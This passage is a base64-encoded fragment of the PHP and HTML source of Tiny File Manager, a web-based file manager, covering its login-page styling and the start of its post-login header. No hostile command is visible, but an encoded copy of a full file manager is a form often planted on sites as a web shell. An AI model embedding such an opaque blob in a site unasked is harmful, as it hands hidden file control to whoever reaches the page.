xoZWFkPg0KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4NCiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPg0KICAgIDxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJXZWIgYmFzZWQgRmlsZSBNYW5hZ2VyIGluIFBIUCwgTWFuYWdlIHlvdXIgZmlsZXMgZWZmaWNpZW50bHkgYW5kIGVhc2lseSB3aXRoIFRpbnkgRmlsZSBNYW5hZ2VyIj4NCiAgICA8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9IkNDUCBQcm9ncmFtbWVycyI+DQogICAgPG1ldGEgbmFtZT0icm9ib3RzIiBjb250ZW50PSJub2luZGV4LCBub2ZvbGxvdyI+DQogICAgPG1ldGEgbmFtZT0iZ29vZ2xlYm90IiBjb250ZW50PSJub2luZGV4Ij4NCiAgICA8P3BocCBpZigkZmF2aWNvbl9wYXRoKSB7IGVjaG8gJzxsaW5rIHJlbD0iaWNvbiIgaHJlZj0iJy5mbV9lbmMoJGZhdmljb25fcGF0aCkuJyIgdHlwZT0iaW1hZ2UvcG5nIj4nOyB9ID8+DQogICAgPHRpdGxlPjw/cGhwIGVjaG8gZm1fZW5jKEFQUF9USVRMRSkgPz48L3RpdGxlPg0KICAgIDw/cGhwIHByaW50X2V4dGVybmFsKCdwcmUtanNkZWxpdnInKTsgPz4NCiAgICA8P3BocCBwcmludF9leHRlcm5hbCgnY3NzLWJvb3RzdHJhcCcpOyA/Pg0KICAgIDxzdHlsZT4NCiAgICAgICAgYm9keS5mbS1sb2dpbi1wYWdleyBiYWNrZ3JvdW5kLWNvbG9yOiNmN2Y5ZmI7Zm9udC1zaXplOjE0cHg7YmFja2dyb3VuZC1jb2xvcjojZjdmOWZiO2JhY2tncm91bmQtaW1hZ2U6dXJsKCJkYXRhOmltYWdlL3N2Zyt4bWwsJTNDc3ZnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2Zycgdmlld0JveD0nMCAwIDMwNCAzMDQnIHdpZHRoPSczMDQnIGhlaWdodD0nMzA0JyUzRSUzQ3BhdGggZmlsbD0nJTIzZTJlOWYxJyBmaWxsLW9wYWNpdHk9JzAuNCcgZD0nTTQ0LjEgMjI0YTUgNSAwIDEgMSAwIDJIMHYtMmg0NC4xem0xNjAgNDhhNSA1IDAgMSAxIDAgMkg4MnYtMmgxMjIuMXptNTcuOC00NmE1IDUgMCAxIDEgMC0ySDMwNHYyaC00Mi4xem0wIDE2YTUgNSAwIDEgMSAwLTJIMzA0djJoLTQyLjF6bTYuMi0xMTRhNSA1IDAgMSAxIDAgMmgtODYuMmE1IDUgMCAxIDEgMC0yaDg2LjJ6bS0yNTYtNDhhNSA1IDAgMSAxIDAgMkgwdi0yaDEyLjF6bTE4NS44IDM0YTUgNSAwIDEgMSAwLTJoODYuMmE1IDUgMCAxIDEgMCAyaC04Ni4yek0yNTggMTIuMWE1IDUgMCAxIDEtMiAwVjBoMnYxMi4xem0tNjQgMjA4YTUgNSAwIDEgMS0yIDB2LTU0LjJhNSA1IDAgMSAxIDIgMHY1NC4yem00OC0xOTguMlY4MGg2MnYyaC02NFYyMS45YTUgNSAwIDEgMSAyIDB6bTE2IDE2VjY0aDQ2djJoLTQ4VjM3LjlhNSA1IDAgMSAxIDIgMHptLTEyOCA5NlYyMDhoMTZ2MTIuMWE1IDUgMCAxIDEtMiAwVjIxMGgtMTZ2LTc2LjFhNSA1IDAgMSAxIDIgMHptLTUuOS0yMS45YTUgNSAwIDEgMSAwIDJIMTE0djQ4SDg1LjlhNSA1IDAgMSAxIDAtMkgxMTJ2LTQ4aDEyLjF6bS02LjIgMTMwYTUgNSAwIDEgMSAwLTJIMTc2di03NC4xYTUgNSAwIDEgMSAyIDBWMjQyaC02MC4xem0tMTYtNjRhNSA1IDAgMSAxIDAtMkgxMTR2NDhoMTAuMWE1IDUgMCAxIDEgMCAySDExMnYtNDhoLTEwLjF6TTY2IDI4NC4xYTUgNSAwIDEgMS0yIDBWMjc0SDUwdjMwaC0ydi0zMmgxOHYxMi4xek0yMzYuMSAxNzZhNSA1IDAgMSAxIDAgMkgyMjZ2OTRoNDh2MzJoLTJ2LTMwaC00OHYtOThoMTIuMXptMjUuOC0zMGE1IDUgMCAxIDEgMC0ySDI3NHY0NC4xYTUgNSAwIDEgMS0yIDBWMTQ2aC0xMC4xem0tNjQgOTZhNSA1IDAgMSAxIDAtMkgyMDh2LTgwaDE2di0xNGgtNDIuMWE1IDUgMCAxIDEgMC0ySDIyNnYxOGgtMTZ2ODBoLTEyLjF6bTg2LjItMjEwYTUgNSAwIDEgMSAwIDJIMjcyVjBoMnYzMmgxMC4xek05OCAxMDEuOVYxNDZINTMuOWE1IDUgMCAxIDEgMC0ySDk2di00Mi4xYTUgNSAwIDEgMSAyIDB6TTUzLjkgMzRhNSA1IDAgMSAxIDAtMkg4MFYwaDJ2MzRINTMuOXptNjAuMSAzLjlWNjZIODJ2NjRINjkuOWE1IDUgMCAxIDEgMC0ySDgwVjY0aDMyVjM3LjlhNSA1IDAgMSAxIDIgMHpNMTAxLjkgODJhNSA1IDAgMSAxIDAtMkgxMjhWMzcuOWE1IDUgMCAxIDEgMiAwVjgyaC0yOC4xem0xNi02NGE1IDUgMCAxIDEgMC0ySDE0NnY0NC4xYTUgNSAwIDEgMS0yIDBWMThoLTI2LjF6bTEwMi4yIDI3MGE1IDUgMCAxIDEgMCAySDk4djE0aC0ydi0xNmgxMjQuMXpNMjQyIDE0OS45VjE2MGgxNnYzNGgtMTZ2NjJoNDh2NDhoLTJ2LTQ2aC00OHYtNjZoMTZ2LTMwaC0xNnYtMTIuMWE1IDUgMCAxIDEgMiAwek01My45IDE4YTUgNSAwIDEgMSAwLTJINjRWMkg0OFYwaDE4djE4SDUzLjl6bTExMiAzMmE1IDUgMCAxIDEgMC0ySDE5MlYwaDUwdjJoLTQ4djQ4aC0yOC4xem0tNDgtNDhhNSA1IDAgMCAxLTkuOC0yaDIuMDdhMyAzIDAgMSAwIDUuNjYgMEgxNzh2MzRoLTE4VjIxLjlhNSA1IDAgMSAxIDIgMFYzMmgxNFYyaC01OC4xem0wIDk2YTUgNSAwIDEgMSAwLTJIMTM3bDMyLTMyaDM5VjIxLjlhNSA1IDAgMSAxIDIgMFY2NmgtNDAuMTdsLTMyIDMySDExNy45em0yOC4xIDkwLjFhNSA1IDAgMSAxLTIgMHYtNzYuNTFMMTc1LjU5IDgwSDIyNFYyMS45YTUgNSAwIDEgMSAyIDBWODJoLTQ5LjU5TDE0NiAxMTIuNDF2NzUuNjl6bTE2IDMyYTUgNSAwIDEgMS0yIDB2LTk5LjUxTDE4NC41OSA5NkgzMDAuMWE1IDUgMCAwIDEgMy45LTMuOXYyLjA3YTMgMyAwIDAgMCAwIDUuNjZ2Mi4wN2E1IDUgMCAwIDEtMy45LTMuOUgxODUuNDFMMTYyIDEyMS40MXY5OC42OXptLTE0NC02NGE1IDUgMCAxIDEtMiAwdi0zLjUxbDQ4LTQ4VjQ4aDMyVjBoMnY1MEg2NnY1NS40MWwtNDggNDh2Mi42OXpNNTAgNTMuOXY0My41MWwtNDggNDhWMjA4aDI2LjFhNSA1IDAgMSAxIDAgMkgwdi02NS40MWw0OC00OFY1My45YTUgNSAwIDEgMSAyIDB6bS0xNiAxNlY4OS40MWwtMzQgMzR2LTIuODJsMzItMzJWNjkuOWE1IDUgMCAxIDEgMiAwek0xMi4xIDMyYTUgNSAwIDEgMSAwIDJIOS40MUwwIDQzLjQxVjQwLjZMOC41OSAzMmgzLjUxem0yNjUuOCAxOGE1IDUgMCAxIDEgMC0yaDE4LjY5bDcuNDEtNy40MXYyLjgyTDI5Ny40MSA1MEgyNzcuOXptLTE2IDE2MGE1IDUgMCAxIDEgMC0ySDI4OHYtNzEuNDFsMTYtMTZ2Mi44MmwtMTQgMTRWMjEwaC0yOC4xem0tMjA4IDMyYTUgNSAwIDEgMSAwLTJINjR2LTIyLjU5TDQwLjU5IDE5NEgyMS45YTUgNSAwIDEgMSAwLTJINDEuNDFMNjYgMjE2LjU5VjI0Mkg1My45em0xNTAuMiAxNGE1IDUgMCAxIDEgMCAySDk2di01Ni42TDU2LjYgMTYySDM3LjlhNSA1IDAgMSAxIDAtMmgxOS41TDk4IDIwMC42VjI1NmgxMDYuMXptLTE1MC4yIDJhNSA1IDAgMSAxIDAtMkg4MHYtNDYuNTlMNDguNTkgMTc4SDIxLjlhNSA1IDAgMSAxIDAtMkg0OS40MUw4MiAyMDguNTlWMjU4SDUzLjl6TTM0IDM5Ljh2MS42MUw5LjQxIDY2SDB2LTJoOC41OUwzMiA0MC41OVYwaDJ2MzkuOHpNMiAzMDAuMWE1IDUgMCAwIDEgMy45IDMuOUgzLjgzQTMgMyAwIDAgMCAwIDMwMi4xN1YyNTZoMTh2NDhoLTJ2LTQ2SDJ2NDIuMXpNMzQgMjQxdjYzaC0ydi02Mkgwdi0yaDM0djF6TTE3IDE4SDB2LTJoMTZWMGgydjE4aC0xem0yNzMtMmgxNHYyaC0xNlYwaDJ2MTZ6bS0zMiAyNzN2MTVoLTJ2LTE0aC0xNHYxNGgtMnYtMTZoMTh2MXpNMCA5Mi4xQTUuMDIgNS4wMiAwIDAgMSA2IDk3YTUgNSAwIDAgMS02IDQuOXYtMi4wN2EzIDMgMCAxIDAgMC01LjY2VjkyLjF6TTgwIDI3MmgydjMyaC0ydi0zMnptMzcuOSAzMmgtMi4wN2EzIDMgMCAwIDAtNS42NiAwaC0yLjA3YTUgNSAwIDAgMSA5LjggMHpNNS45IDBBNS4wMiA1LjAyIDAgMCAxIDAgNS45VjMuODNBMyAzIDAgMCAwIDMuODMgMEg1Ljl6bTI5NC4yIDBoMi4wN0EzIDMgMCAwIDAgMzA0IDMuODNWNS45YTUgNSAwIDAgMS0zLjktNS45em0zLjkgMzAwLjF2Mi4wN2EzIDMgMCAwIDAtMS44MyAxLjgzaC0yLjA3YTUgNSAwIDAgMSAzLjktMy45ek05NyAxMDBhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0wLTE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMTYgMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0xNiAxNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTAgMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0tNDggMzJhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0xNiAxNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTMyIDQ4YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptLTE2IDE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMzItMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0wLTMyYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMTYgMzJhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0zMiAxNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTAtMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0tMTYtNjRhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0xNiAwYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMTYgOTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0wIDE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMTYgMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0xNi0xNDRhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0wIDMyYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMTYtMzJhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0xNi0xNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bS05NiAwYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMCAxNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTE2LTMyYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptOTYgMGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bS0xNi02NGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTE2LTE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptLTMyIDBhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0wLTE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptLTE2IDBhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0tMTYgMGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bS0xNiAwYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnpNNDkgMzZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0tMzIgMGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTMyIDE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnpNMzMgNjhhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0xNi00OGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTAgMjQwYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMTYgMzJhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0tMTYtNjRhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0wIDE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptLTE2LTMyYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptODAtMTc2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMTYgMGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bS0xNi0xNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTMyIDQ4YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMTYtMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0wLTMyYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMTEyIDE3NmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bS0xNiAxNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTAgMTZhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0wIDE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnpNMTcgMTgwYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMCAxNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTAtMzJhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0xNiAwYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnpNMTcgODRhMyAzIDAgMSAwIDAtNiAzIDMgMCAwIDAgMCA2em0zMiA2NGEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTE2LTE2YTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnonJTNFJTNDL3BhdGglM0UlM0Mvc3ZnJTNFIik7fQ0KICAgICAgICAuZm0tbG9naW4tcGFnZSAuYnJhbmR7IHdpZHRoOjEyMXB4O292ZXJmbG93OmhpZGRlbjttYXJnaW46MCBhdXRvO3Bvc2l0aW9uOnJlbGF0aXZlO3otaW5kZXg6MX0NCiAgICAgICAgLmZtLWxvZ2luLXBhZ2UgLmJyYW5kIGltZ3sgd2lkdGg6MTAwJX0NCiAgICAgICAgLmZtLWxvZ2luLXBhZ2UgLmNhcmQtd3JhcHBlcnsgd2lkdGg6MzYwcHg7bWFyZ2luLXRvcDoxMCU7bWFyZ2luLWxlZnQ6YXV0bzttYXJnaW4tcmlnaHQ6YXV0bzt9DQogICAgICAgIC5mbS1sb2dpbi1wYWdlIC5jYXJkeyBib3JkZXItY29sb3I6dHJhbnNwYXJlbnQ7Ym94LXNoYWRvdzowIDRweCA4cHggcmdiYSgwLDAsMCwuMDUpfQ0KICAgICAgICAuZm0tbG9naW4tcGFnZSAuY2FyZC10aXRsZXsgbWFyZ2luLWJvdHRvbToxLjVyZW07Zm9udC1zaXplOjI0cHg7Zm9udC13ZWlnaHQ6NDAwO30NCiAgICAgICAgLmZtLWxvZ2luLXBhZ2UgLmZvcm0tY29udHJvbHsgYm9yZGVyLXdpZHRoOjIuM3B4fQ0KICAgICAgICAuZm0tbG9naW4tcGFnZSAuZm9ybS1ncm91cCBsYWJlbHsgd2lkdGg6MTAwJX0NCiAgICAgICAgLmZtLWxvZ2luLXBhZ2UgLmJ0bi5idG4tYmxvY2t7IHBhZGRpbmc6MTJweCAxMHB4fQ0KICAgICAgICAuZm0tbG9naW4tcGFnZSAuZm9vdGVyeyBtYXJnaW46NDBweCAwO2NvbG9yOiM4ODg7dGV4dC1hbGlnbjpjZW50ZXJ9DQogICAgICAgIEBtZWRpYSBzY3JlZW4gYW5kIChtYXgtd2lkdGg6NDI1cHgpew0KICAgICAgICAgICAgLmZtLWxvZ2luLXBhZ2UgLmNhcmQtd3JhcHBlcnsgd2lkdGg6OTAlO21hcmdpbjowIGF1dG87bWFyZ2luLXRvcDoxMCU7fQ0KICAgICAgICB9DQogICAgICAgIEBtZWRpYSBzY3JlZW4gYW5kIChtYXgtd2lkdGg6MzIwcHgpew0KICAgICAgICAgICAgLmZtLWxvZ2luLXBhZ2UgLmNhcmQuZmF0eyBwYWRkaW5nOjB9DQogICAgICAgICAgICAuZm0tbG9naW4tcGFnZSAuY2FyZC5mYXQgLmNhcmQtYm9keXsgcGFkZGluZzoxNXB4fQ0KICAgICAgICB9DQogICAgICAgIC5tZXNzYWdleyBwYWRkaW5nOjRweCA3cHg7Ym9yZGVyOjFweCBzb2xpZCAjZGRkO2JhY2tncm91bmQtY29sb3I6I2ZmZn0NCiAgICAgICAgLm1lc3NhZ2Uub2t7IGJvcmRlci1jb2xvcjpncmVlbjtjb2xvcjpncmVlbn0NCiAgICAgICAgLm1lc3NhZ2UuZXJyb3J7IGJvcmRlci1jb2xvcjpyZWQ7Y29sb3I6cmVkfQ0KICAgICAgICAubWVzc2FnZS5hbGVydHsgYm9yZGVyLWNvbG9yOm9yYW5nZTtjb2xvcjpvcmFuZ2V9DQogICAgICAgIGJvZHkuZm0tbG9naW4tcGFnZS50aGVtZS1kYXJrIHtiYWNrZ3JvdW5kLWNvbG9yOiAjMmYyYTJhO30NCiAgICAgICAgLnRoZW1lLWRhcmsgc3ZnIGcsIC50aGVtZS1kYXJrIHN2ZyBwYXRoIHtmaWxsOiAjZmZmZmZmOyB9DQogICAgPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5IGNsYXNzPSJmbS1sb2dpbi1wYWdlIDw/cGhwIGVjaG8gKEZNX1RIRU1FID09ICJkYXJrIikgPyAndGhlbWUtZGFyaycgOiAnJzsgPz4iPg0KPGRpdiBpZD0id3JhcHBlciIgY2xhc3M9ImNvbnRhaW5lci1mbHVpZCI+DQoNCiAgICA8P3BocA0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIFNob3cgcGFnZSBmb290ZXIgaW4gTG9naW4gRm9ybQ0KICAgICAqLw0KICAgIGZ1bmN0aW9uIGZtX3Nob3dfZm9vdGVyX2xvZ2luKCkNCiAgICB7DQogICAgPz4NCjwvZGl2Pg0KPD9waHAgcHJpbnRfZXh0ZXJuYWwoJ2pzLWpxdWVyeScpOyA/Pg0KPD9waHAgcHJpbnRfZXh0ZXJuYWwoJ2pzLWJvb3RzdHJhcCcpOyA/Pg0KPC9ib2R5Pg0KPC9odG1sPg0KPD9waHANCn0NCg0KLyoqDQogKiBTaG93IEhlYWRlciBhZnRlciBsb2dpbg0KICovDQpmdW5jdGlvbiBmbV9zaG93X2hlYWRlcigpDQp7DQokc3ByaXRlc192ZXIgPSAnMjAxNjAzMTUnOw0KaGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIpOw0KaGVhZGVyKCJFeHBpcmVzOiBTYXQsIDI2IEp1bCAxOTk3IDA1OjAwOjAwIEdNVCIpOw0KaGVhZGVyKCJDYWNoZS1Db250cm9sOiBuby1zdG9yZSwgbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZSwgcG9zdC1jaGVjaz0wLCBwcmUtY2hlY2s9MCIpOw0KaGVhZGVyKCJQcmFnbWE6IG5vLWNhY2hlIik7DQoNCmdsb2JhbCAkbGFuZywgJHJvb3RfdXJsLCAkc3RpY2t5X25hdmJhciwgJGZhdmljb25fcGF0aDsNCiRpc1N0aWNreU5hdkJhciA9ICRzdGlja3lfbmF2YmFyID8gJ25hdmJhci1maXhlZCcgOiAnbmF2YmFyLW5vcm1hbCc7DQo/Pg0KPCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4NCiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPg0KICAgIDxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJXZWIgYmFzZWQgRmlsZSBNYW5hZ2VyIGluIFBIUCwgTWFuYWdlIHlvdXIgZmlsZXMgZWZmaWNpZW50bHkgYW5kIGVhc2lseSB3aXRoIFRpbnkgRmlsZSBNYW5hZ2VyIj4NCiAgICA8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9IkNDUCBQcm9ncmFtbWVycyI+DQogICAgPG1ldGEgbmFtZT0icm9ib3RzIiBjb250ZW50PSJub2luZGV4LCBub2ZvbGxvdyI+DQogICAgPG1ldGEgbmFtZT0iZ29vZ2xlYm90IiBjb250ZW50PSJub2luZGV4Ij4NCiAgICA8P3BocCBpZigkZmF2aWNvbl9wYXRoKSB7IGVjaG8gJzxsaW5rIHJlbD0iaWNvbiIgaHJlZj0iJy5mbV9lbmMoJGZhdmljb25fcGF0aCkuJyIgdHlwZT0iaW1hZ2UvcG5nIj4nOyB9ID8+DQogICAgPHRpdGxlPjw/cGhwIGVjaG8gZm1fZW5jKEFQUF9USVRMRSkgPz48L3RpdGxlPg0KICAgIDw/cGhwIHByaW50X2V4dGVybmFsKCdwcmUtanNkZWxpdnInKTsgPz4NCiAgICA8P3BocCBwcmludF9leHRlcm5hbCgncHJlLWNsb3VkZmxhcmUnKTsgPz4NCiAgICA8P3BocCBwcmludF9leHRlcm5hbCgnY3NzLWJvb3RzdHJhcCcpOyA/Pg0KICAgIDw/cGhwIHByaW50X2V4dGVybmFsKCdjc3MtZm9udC1hd2Vzb21lJyk7ID8+DQogICAgPD9waHAgaWYgKEZNX1VTRV9ISUdITElHSFRKUyAmJiBpc3NldCgkX0dFVFsndmlldyddKSk6ID8+DQogICAgPD9waHAgcHJpbnRfZXh0ZXJuYWwoJ2Nzcy1oaWdobGlnaHRqcycpOyA/Pg0KICAgIDw/cGhwIGVuZGlmOyA/Pg0KICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij53aW5kb3cuY3NyZiA9ICc8P3BocCBlY2hvICRfU0VTU0lPTlsndG9rZW4nXTsgPz4nOzwvc2NyaXB0Pg0KICAgIDxzdHlsZT4NCiAgICAgICAgaHRtbCB7IC1tb3otb3N4LWZvbnQtc21vb3RoaW5nOiBncmF5c2NhbGU7IC13ZWJraXQtZm9udC1zbW9vdGhpbmc6IGFudGlhbGlhc2VkOyB0ZXh0LXJlbmRlcmluZzogb3B0aW1pemVMZWdpYmlsaXR5OyBoZWlnaHQ6IDEwMCU7IHNjcm9sbC1iZWhhdmlvcjogc21vb3RoO30NCiAgICAgICAgKiwqOjpiZWZvcmUsKjo6YWZ0ZXIgeyBib3gtc2l6aW5nOiBib3JkZXItYm94O30NCiAgICAgICAgYm9keSB7IGZvbnQtc2l6ZToxNXB4OyBjb2xvcjojMjIyO2JhY2tncm91bmQ6I0Y3RjdGNzsgfQ0KICAgICAgICBib2R5Lm5hdmJhci1maXhlZCB7IG1hcmdpbi10b3A6NTVweDsgfQ0KICAgICAgICBhLCBhOmhvdmVyLCBhOnZpc2l0ZWQsIGE6Zm9jdXMgeyB0ZXh0LWRlY29yYXRpb246bm9uZSAhaW1wb3J0YW50OyB9DQogICAgICAgIC5maWxlbmFtZSwgdGQsIHRoIHsgd2hpdGUtc3BhY2U6bm93cmFwICB9DQogICAgICAgIC5uYXZiYXItYnJhbmQgeyBmb250LXdlaWdodDpib2xkOyB9DQogICAgICAgIC5uYXYtaXRlbS5hdmF0YXIgYSB7IGN1cnNvcjpwb2ludGVyO3RleHQtdHJhbnNmb3JtOmNhcGl0YWxpemU7IH0NCiAgICAgICAgLm5hdi1pdGVtLmF2YXRhciBhID4gaSB7IGZvbnQtc2l6ZToxNXB4OyB9DQogICAgICAgIC5uYXYtaXRlbS5hdmF0YXIgLmRyb3Bkb3duLW1lbnUgYSB7IGZvbnQtc2l6ZToxM3B4OyB9DQogICAgICAgICNzZWFyY2gtYWRkb24geyBmb250LXNpemU6MTJweDtib3JkZXItcmlnaHQtd2lkdGg6MDsgfQ0KICAgICAgICAuYnJsLTAgeyBiYWNrZ3JvdW5kOnRyYW5zcGFyZW50O2JvcmRlci1sZWZ0OjA7IGJvcmRlci10b3AtbGVmdC1yYWRpdXM6IDA7IGJvcmRlci1ib3R0b20tbGVmdC1yYWRpdXM6IDA7IH0NCiAgICAgICAgLmJyci0wIHsgYm9yZGVyLXRvcC1yaWdodC1yYWRpdXM6IDA7IGJvcmRlci1ib3R0b20tcmlnaHQtcmFkaXVzOiAwOyB9DQogICAgICAgIC5icmVhZC1jcnVtYiB7IGNvbG9yOiNjY2NjY2M7Zm9udC1zdHlsZTpub3JtYWw7IH0NCiAgICAgICAgI21haW4tdGFibGUgeyB0cmFuc2l0aW9uOiB0cmFuc2Zvcm0gLjI1cyBjdWJpYy1iZXppZXIoMC40LCAwLjUsIDAsIDEpLHdpZHRoIDBzIC4yNXM7fQ0KICAgICAgICAjbWFpbi10YWJsZSAuZmlsZW5hbWUgYSB7IGNvbG9yOiMyMjIyMjI7IH0NCiAgICAgICAgLnRhYmxlIHRkLCAudGFibGUgdGggeyB2ZXJ0aWNhbC1hbGlnbjptaWRkbGUgIWltcG9ydGFudDsgfQ0KICAgICAgICAudGFibGUgLmN1c3RvbS1jaGVja2JveC10ZCAuY3VzdG9tLWNvbnRyb2wuY3VzdG9tLWNoZWNrYm94LCAudGFibGUgLmN1c3RvbS1jaGVja2JveC1oZWFkZXIgLmN1c3RvbS1jb250cm9sLmN1c3RvbS1jaGVja2JveCB7IG1pbi13aWR0aDoxOHB4OyBkaXNwbGF5OiBmbGV4O2FsaWduLWl0ZW1zOiBjZW50ZXI7IGp1c3RpZnktY29udGVudDogY2VudGVyOyB9DQogICAgICAgIC50YWJsZS1zbSB0ZCwgLnRhYmxlLXNtIHRoIHsgcGFkZGluZzouNHJlbTsgfQ0KICAgICAgICAudGFibGUtYm9yZGVyZWQgdGQsIC50YWJsZS1ib3JkZXJlZCB0aCB7IGJvcmRlcjoxcHggc29saWQgI2YxZjFmMTsgfQ0KICAgICAgICAuaGlkZGVuIHsgZGlzcGxheTpub25lICB9DQogICAgICAgIHByZS53aXRoLWhsanMgeyBwYWRkaW5nOjA7IG92ZXJmbG93OiBoaWRkZW47ICB9DQogICAgICAgIHByZS53aXRoLWhsanMgY29kZSB7IG1hcmdpbjowO2JvcmRlcjowO292ZXJmbG93OnNjcm9sbDsgIH0NCiAgICAgICAgY29kZS5tYXhoZWlnaHQsIHByZS5tYXhoZWlnaHQgeyBtYXgtaGVpZ2h0OjUxMnB4ICB9DQogICAgICAgIC5mYS5mYS1jYXJldC1yaWdodCB7IGZvbnQtc2l6ZToxLjJlbTttYXJnaW46MCA0cHg7dmVydGljYWwtYWxpZ246bWlkZGxlO2NvbG9yOiNlY2VjZWMgIH0NCiAgICAgICAgLmZhLmZhLWhvbWUgeyBmb250LXNpemU6MS4zZW07dmVydGljYWwtYWxpZ246Ym90dG9tICB9DQogICAgICAgIC5wYXRoIHsgbWFyZ2luLWJvdHRvbToxMHB4ICB9DQogICAgICAgIGZvcm0uZHJvcHpvbmUgeyBtaW4taGVpZ2h0OjIwMHB4O2JvcmRlcjoycHggZGFzaGVkICMwMDdiZmY7bGluZS1oZWlnaHQ6NnJlbTsgfQ0KICAgICAgICAucmlnaHQgeyB0ZXh0LWFsaWduOnJpZ2h0ICB9DQogICAgICAgIC5jZW50ZXIsIC5jbG9zZSwgLmxvZ2luLWZvcm0sIC5wcmV2aWV3LWltZy1jb250YWluZXIgeyB0ZXh0LWFsaWduOmNlbnRlciAgfQ0KICAgICAgICAubWVzc2FnZSB7IHBhZGRpbmc6NHB4IDdweDtib3JkZXI6MXB4IHNvbGlkICNkZGQ7YmFja2dyb3VuZC1jb2xvcjojZmZmICB9DQogICAgICAgIC5tZXNzYWdlLm9r